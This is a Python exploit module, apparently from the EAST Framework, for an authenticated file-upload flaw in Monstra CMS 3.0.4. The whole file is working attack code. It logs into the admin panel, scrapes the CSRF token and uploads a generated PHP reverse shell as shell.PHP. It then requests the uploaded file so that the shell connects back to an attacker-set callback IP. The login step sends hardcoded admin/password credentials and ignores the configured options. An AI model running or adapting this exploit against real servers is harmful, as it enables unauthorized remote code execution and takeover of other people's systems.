#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2
import re
import cookielib
import time
from collections import OrderedDict

sys.path.append('./core')
sys.path.append('./shellcodes')
import ShellUtils
import Shellcodes
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_monstra_cms_fu_rce"
INFO['DESCRIPTION'] = "Monstra CMS 3.0.4 - Arbitrary File Upload / Remote Code Execution"
INFO['VENDOR'] = "http://monstra.org/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/43348/']
INFO["CVE Name"] = "?"
INFO["NOTES"] = """MonstraCMS 3.0.4 allows users to upload arbitrary files which leads to a remote command execution on the remote server.
"""

INFO['CHANGELOG'] = "18 Dec, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.207", dict(description = 'Target IP')
OPTIONS["PORT"] = 80, dict(description = 'Target port')
OPTIONS['USERNAME'] = 'editor', dict(description = 'Username')
OPTIONS['PASSWORD'] = 'password', dict(description = 'Password')
OPTIONS["BASEPATH"] = '/monstra', dict(description = 'Basepath')
OPTIONS["CALLBACK_IP"] = "192.168.1.44", dict(description = 'Callback IP')


class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.username = ''
        self.password = ''
        self.basepath = OPTIONS["BASEPATH"]
        self.callback_ip = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.username = self.args.get('USERNAME', self.username)
        self.password = self.args.get('PASSWORD', self.password)
        self.basepath = self.args.get('BASEPATH', self.basepath)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
        
        self.cookiesjar = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookiesjar))
        urllib2.install_opener(opener)
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}{}'.format(self.host, self.port, self.basepath, path)
    
    def make_sploit(self):
        self.log("[>] Generate shellcode started")
        
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None

        s = Shellcodes.CrossOSShellcodes(self.callback_ip, port)
        shellcode = s.create_shellcode(ShellUtils.Constants.ShellcodeType.PHP, True)

        self.log("[>] Shellcode ready")
        return shellcode
        
    def make_data(self, csrf, content):
        data = '--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="csrf"\r\n\r\n'
        data += csrf
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="file"; filename="shell.PHP"\r\n'
        data += 'Content-Type: application/octet-stream\r\n\r\n'
        data += content
        data += '\r\n--o0oOo0o\r\n'
        data += 'Content-Disposition: form-data; name="upload_file"\r\n\r\n'
        data += 'Upload'
        data += '\r\n--o0oOo0o--\r\n'
        return data
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        if self.is_listener_connected() is None:
            self.log('Please, enable listener to use this module')
            self.finish(False)
        
        
        self.log('Authentificating with {}:{}'.format(self.username, self.password))
        
        url = self.make_url('/admin/')
        data = 'login=admin&password=password&login_submit=Log+In'

        request = urllib2.Request(url, data)
        try:
            fd = urllib2.urlopen(request)
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        url = self.make_url('/admin/index.php?id=filesmanager')
        request = urllib2.Request(url)
        result = ''
        try:
            fd = urllib2.urlopen(request)
            result = fd.read()
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        csrf = re.findall('csrf\":\"(.*)\"\,', result)[0]
        
        data = self.make_data(csrf, self.make_sploit()[1:])
        request = urllib2.Request(url, data)
        request.add_header('Content-Length', len(data))
        request.add_header('Content-Type', 'multipart/form-data; boundary=o0oOo0o')
        
        try:
            fd = urllib2.urlopen(request)
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log('All files uploaded. Execute shell.php ...')
        try:
            urllib2.urlopen(self.make_url('/public/uploads/shell.php'), timeout=3)
        except Exception as e:
            pass
            
        while True:
            if self.is_listener_connected():
                break
            time.sleep(3)
        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
